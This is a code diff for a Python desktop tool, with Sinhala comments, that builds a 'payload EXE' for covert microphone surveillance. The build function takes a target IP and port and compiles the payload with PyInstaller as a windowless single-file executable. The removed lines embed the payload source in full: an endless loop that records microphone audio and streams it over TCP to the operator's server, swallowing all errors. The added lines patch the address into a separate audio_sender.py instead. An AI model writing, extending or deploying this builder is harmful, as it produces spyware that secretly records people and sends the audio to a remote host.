@@ -101,7 +101,6 @@ class MainSystem(QMainWindow):
         self.check_auto_rec.setChecked(conf.get('auto_rec', False))
         self.check_auto_rec.setStyleSheet("color: #e74c3c; font-weight: bold; font-size: 13px; margin-bottom: 10px;")
         
-        # මෙන්න මෙතන තමයි අලුත් කොටස: Tick එක දාද්දි ලොග් එකට මැසේජ් එක යවන විදිය
         self.check_auto_rec.stateChanged.connect(self.log_auto_rec_status)
         
         dash_log_panel.addWidget(self.check_auto_rec)
@@ -141,7 +140,6 @@ class MainSystem(QMainWindow):
         self.signals.update_build_log.connect(lambda msg: self.build_log_list.insertItem(0, f"[{time.strftime('%H:%M:%S')}] {msg}"))
         self.signals.build_done.connect(self.on_build_done)
 
-    # Tick එකේ Status එක Log එකට දාන Function එක
     def log_auto_rec_status(self):
         status = "ENABLED" if self.check_auto_rec.isChecked() else "DISABLED"
         self.signals.update_dash_log.emit(f"Auto-Record Mode: {status}")
@@ -211,20 +209,51 @@ class MainSystem(QMainWindow):
                 wf.setnchannels(1); wf.setsampwidth(2); wf.setframerate(44100); wf.writeframes(data)
         except: pass
 
+    # --- Updated Build EXE Function ---
     def build_exe(self):
-        ip, port = self.ip_input.text(), self.port_input.text()
+        target_ip = self.ip_input.text()
+        target_port = self.port_input.text()
+        
         self.btn_build.setEnabled(False)
-        self.signals.update_build_log.emit("🔨 Building Payload EXE... (Wait 1 min)")
+        self.signals.update_build_log.emit(f"🔨 Building Payload for {target_ip}:{target_port}...")
         
         def run_build():
-            src = f"import socket, sounddevice as sd, time\ndef r():\n while True:\n  try:\n   c = sd.rec(int(10*44100),44100,1,'int16')\n   sd.wait()\n   with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:\n    s.settimeout(5);s.connect(('{ip}',{port}));s.sendall(c.tobytes())\n  except:time.sleep(5)\nr()"
-            with open("temp_p.py", "w") as f: f.write(src)
             try:
-                subprocess.check_call(["pyinstaller", "--noconsole", "--onefile", "temp_p.py"])
+                # 1. Original audio_sender.py kiyawanna
+                if not os.path.exists("audio_sender.py"):
+                    self.signals.update_build_log.emit("❌ Error: audio_sender.py not found!")
+                    self.signals.build_done.emit("err")
+                    return
+
+                with open("audio_sender.py", "r", encoding="utf-8") as f:
+                    lines = f.readlines()
+
+                # 2. IP saha Port dashboard eken ena values walin update karanna
+                new_lines = []
+                for line in lines:
+                    if line.strip().startswith("SERVER_IP ="):
+                        new_lines.append(f"SERVER_IP = '{target_ip}'\n")
+                    elif line.strip().startswith("PORT ="):
+                        new_lines.append(f"PORT = {target_port}\n")
+                    else:
+                        new_lines.append(line)
+
+                # 3. Temporary payload file ekak hadanna
+                temp_filename = "temp_payload_build.py"
+                with open(temp_filename, "w", encoding="utf-8") as f:
+                    f.writelines(new_lines)
+
+                # 4. PyInstaller use karala EXE eka hadanna
+                # python -m use karala PATH issue eka bypass karanawa
+                subprocess.check_call([sys.executable, "-m", "PyInstaller", "--noconsole", "--onefile", "--name=audio_sender_payload", temp_filename])
+                
                 self.signals.build_done.emit("ok")
-            except: self.signals.build_done.emit("err")
+            except Exception as e:
+                self.signals.update_build_log.emit(f"❌ Error: {str(e)}")
+                self.signals.build_done.emit("err")
             finally:
-                if os.path.exists("temp_p.py"): os.remove("temp_p.py")
+                if os.path.exists(temp_filename):
+                    os.remove(temp_filename)
 
         threading.Thread(target=run_build, daemon=True).start()
 
@@ -233,7 +262,8 @@ class MainSystem(QMainWindow):
         if status == "ok":
             self.signals.update_build_log.emit("✅ BUILD SUCCESS!")
             QMessageBox.information(self, "Success", "Payload EXE created in 'dist' folder!")
-            os.startfile(os.path.join(os.getcwd(), "dist"))
+            if os.path.exists("dist"):
+                os.startfile(os.path.join(os.getcwd(), "dist"))
         else:
             self.signals.update_build_log.emit("❌ BUILD FAILED!")
 
